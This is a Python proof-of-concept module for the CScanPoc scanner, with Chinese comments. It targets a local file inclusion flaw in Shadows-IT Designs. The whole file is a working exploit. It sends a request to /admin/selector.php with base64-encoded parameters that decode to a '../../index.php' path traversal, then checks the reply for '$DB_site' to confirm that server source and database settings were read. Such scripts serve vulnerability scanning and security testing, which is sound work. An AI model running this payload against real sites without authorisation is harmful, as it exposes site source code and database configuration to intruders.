# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ShadowsIT_0000'  # 平台漏洞编号，留空
    name = 'Shadows-IT Designs本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-05-25'  # 漏洞公布时间
    desc = '''
        Shadows-IT Designs本地文件包含漏洞。
        /admin/selector.php?page=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShadowsIT'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '82342210-9cee-4a29-9ce2-9b0ca65db5cc'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/admin/selector.php?page=dXBsb2FkX2ZpbGU=&op=ZHJhd19jYXRfcGhvdG8=&id=Li4vLi4vaW5kZXgucGhw'
            target = arg+payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and '$DB_site' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
